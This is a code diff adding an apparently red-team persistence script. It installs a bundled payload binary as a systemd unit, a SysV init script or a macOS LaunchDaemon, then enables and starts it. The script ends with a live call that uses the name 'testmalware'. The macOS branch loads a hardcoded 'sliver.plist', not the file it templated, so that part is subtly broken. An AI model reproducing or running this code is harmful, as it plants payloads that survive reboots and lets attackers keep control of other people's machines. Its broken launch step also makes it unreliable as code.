@@ -1,0 +1,82 @@
+def is_using_systemd():
+    command_get_res = sys.shell("command -v systemctl")
+    if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
+        for canary in ["/run/systemd/system/", "/dev/.run/systemd/", "/dev/.systemd/"]:
+            if file.is_dir(canary):
+                return True
+    return False
+
+def is_using_sysvinit():
+    command_get_res = sys.shell("command -v update-rc.d")
+    if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
+        return True
+    return False
+
+def systemd(service_name, service_desc, executable_path):
+    assets.copy("persist_service/files/systemd.service.j2","/tmp/systemd.service.j2")
+    args = {
+        "SERVICE_NAME":service_name, 
+        "SERVICE_DESC":service_desc,
+        "SERVICE_START_CMD":executable_path
+    }
+    file.template("/tmp/systemd.service.j2","/usr/lib/systemd/system/"+service_name+".service", args, False)
+    file.remove("/tmp/systemd.service.j2")
+
+    assets.copy("persist_service/files/payload.elf", executable_path)
+    sys.shell("chmod +x "+executable_path)
+    
+    sys.shell("systemctl daemon-reload "+service_name)
+    sys.shell("systemctl enable "+service_name)
+    sys.shell("systemctl start "+service_name)
+
+def sysvinit(service_name, service_desc, executable_path):
+    assets.copy("persist_service/files/sysvinit.sh.j2","/tmp/svc.sh.j2")
+    args = {
+        "SERVICE_NAME":service_name, 
+        "SERVICE_DESC":service_desc,
+        "SERVICE_START_CMD":executable_path
+    }
+    file.template("/tmp/svc.sh.j2","/etc/init.d/"+service_name, args, False)
+    file.remove("/tmp/svc.sh.j2")
+    sys.shell("chmod +x "+"/etc/init.d/"+service_name)
+
+    assets.copy("persist_service/files/payload.elf", executable_path)
+    sys.shell("chmod +x "+executable_path)
+    
+    sys.shell("update-rc.d "+service_name+" defaults")
+    sys.shell("service "+service_name+" start")
+
+def launch_daemon(service_name, executable_path):
+    assets.copy("persist_service/files/launch_daemon.plist.j2","/tmp/plist.j2")
+    args = {
+        "service_name":"com.testing."+service_name, 
+        "bin_path":executable_path
+    }
+    file.template("/tmp/plist.j2","/Library/LaunchDaemons/"+service_name+".plist", args, False)
+    file.remove("/tmp/plist.j2")
+    
+    assets.copy("persist_service/files/payload.macho", executable_path)
+    sys.shell("chmod +x "+executable_path)
+    sys.shell("launchctl load -w /Library/LaunchDaemons/sliver.plist")
+
+def persist_service(service_name, service_desc, executable_name):
+    if sys.is_linux():
+        executable_path = "/usr/local/bin/"+executable_name
+        if is_using_systemd():
+            systemd(service_name, service_desc, executable_path)
+        elif is_using_sysvinit():
+            sysvinit(service_name, service_desc, executable_path)
+    elif sys.is_macos():
+        executable_path = "/var/root/"+executable_name
+        launch_daemon(service_name, executable_path)
+    else:
+        print("OS not supported")
+
+#print(assets.list())
+persist_service('test123', 'testing123', 'testmalware')
+#persist_service(
+#    input_params['service_name'],
+#    input_params['service_desc'],
+#    input_params['executable_name']
+#)
+
